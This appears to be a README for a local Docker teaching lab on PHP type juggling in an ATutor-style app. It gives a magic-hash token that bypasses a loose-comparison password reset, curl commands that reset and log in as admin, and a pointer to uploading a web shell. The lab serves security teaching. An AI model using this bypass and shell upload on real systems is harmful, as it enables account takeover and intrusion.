# Type Juggling Lab (Docker)

ATutor-**style** teaching app (banner includes “ATutor” for PoC recon).

```bash
./labctl.sh up type-juggling
```

- URL: http://127.0.0.1:8107/login.php
- Admin reset token is magic hash `0e4620…`
- Reset: `/reset.php?user=admin&token=0e8304…&newpass=pwned` (loose `==`)
- Then login admin / upload shell at `/admin.php`

```bash
# Manual path often clearer than full vendor PoC
curl 'http://127.0.0.1:8107/reset.php?user=admin&token=0e830400451993494058024219903391&newpass=pwned'
curl -c jar -b jar -X POST -d 'user=admin&pass=pwned' http://127.0.0.1:8107/login.php
```

Full ATutor PoC may diverge; use this lab for the **class**, then real ATutor VM for vendor fidelity.
